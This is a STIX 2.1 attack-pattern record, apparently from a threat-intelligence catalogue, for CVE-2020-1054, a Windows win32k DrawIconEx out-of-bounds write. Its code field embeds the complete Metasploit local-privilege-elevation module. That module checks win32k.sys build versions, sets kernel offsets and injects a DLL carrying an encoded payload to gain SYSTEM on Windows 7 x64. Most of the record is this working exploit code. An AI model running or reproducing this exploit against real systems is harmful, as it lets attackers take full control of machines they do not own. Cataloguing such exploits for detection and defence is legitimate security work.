{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd0d0223-3909-411e-b2c4-95233f8431ac",
    "created": "2024-08-14T16:50:08.725625Z",
    "modified": "2024-08-14T16:50:08.725629Z",
    "name": "Microsoft Windows DrawIconEx OOB Write Local Privilege Elevation",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2020_1054_drawiconex_lpe.rb",
            "external_id": "cve_2020_1054_drawiconex_lpe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-1054"
        },
        {
            "source_name": "reference",
            "url": "https://cpr-zero.checkpoint.com/vulns/cprid-2153/"
        },
        {
            "source_name": "reference",
            "url": "https://0xeb-bp.com/blog/2020/06/15/cve-2020-1054-analysis.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/DreamoneOnly/2020-1054/blob/master/x64_src/main.cpp"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/KaLendsi/CVE-2020-1054/blob/master/CVE-2020-1054/exploit.cpp"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Iamgublin/CVE-2020-1054/blob/master/ConsoleApplication4.cpp"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core/post/file'\nrequire 'msf/core/exploit/exe'\nrequire 'msf/core/post/windows/priv'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Windows DrawIconEx OOB Write Local Privilege Elevation',\n        'Description' => %q{\n          This module exploits CVE-2020-1054, an out of bounds write reachable from DrawIconEx\n          within win32k. The out of bounds write can be used to overwrite the pvbits of a\n          SURFOBJ. By utilizing this vulnerability to execute controlled writes to kernel\n          memory, an attacker can gain arbitrary code execution as the SYSTEM user.\n\n          This module has been tested against a fully updated Windows 7 x64 SP1. Offsets\n          within the exploit code may need to be adjusted to work with other versions of\n          Windows.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Netanel Ben-Simon',\n          'Yoav Alon',\n          'bee13oy',\n          'timwr', # msf module\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows 7 x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'WfsDelay' => 30\n        },\n        'Payload' => {\n          'Space' => 4096\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_OS_RESTARTS ],\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'References' => [\n          ['CVE', '2020-1054'],\n          ['URL', 'https://cpr-zero.checkpoint.com/vulns/cprid-2153/'],\n          ['URL', 'https://0xeb-bp.com/blog/2020/06/15/cve-2020-1054-analysis.html'],\n          ['URL', 'https://github.com/DreamoneOnly/2020-1054/blob/master/x64_src/main.cpp'],\n          ['URL', 'https://github.com/KaLendsi/CVE-2020-1054/blob/master/CVE-2020-1054/exploit.cpp'],\n          ['URL', 'https://github.com/Iamgublin/CVE-2020-1054/blob/master/ConsoleApplication4.cpp']\n        ],\n        'DisclosureDate' => '2020-02-20'\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return CheckCode::Safe\n    end\n\n    file_path = expand_path('%WINDIR%\\\\system32\\\\win32k.sys')\n    major, minor, build, revision, branch = file_version(file_path)\n    vprint_status(\"win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")\n\n    build_num_gemversion = Rex::Version.new(\"#{major}.#{minor}.#{build}.#{revision}\")\n    if (build_num_gemversion >= Rex::Version.new('6.1.7600.0')) && (build_num_gemversion < Rex::Version.new('6.1.7601.24542')) # Windows 7 SP1\n      @xleft_offset = 0x900\n      @oob_offset = 0x238\n      return CheckCode::Appears\n    elsif (build_num_gemversion >= Rex::Version.new('6.1.7600.0')) && (build_num_gemversion < Rex::Version.new('6.1.7601.24553')) # Windows 7 SP1 with patches\n      @xleft_offset = 0x8c0\n      @oob_offset = 0x240\n      return CheckCode::Appears\n    else\n      return CheckCode::Safe(\"No target for win32k.sys version #{build_num_gemversion}\")\n    end\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] != ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 32-bit systems is not supported')\n    end\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Executing exploit...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-1054', 'exploit.dll'),\n      [@xleft_offset, @oob_offset, encoded_payload.length].pack('LLL') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-02-20",
    "x_mitre_platforms": [
        "win'"
    ]
}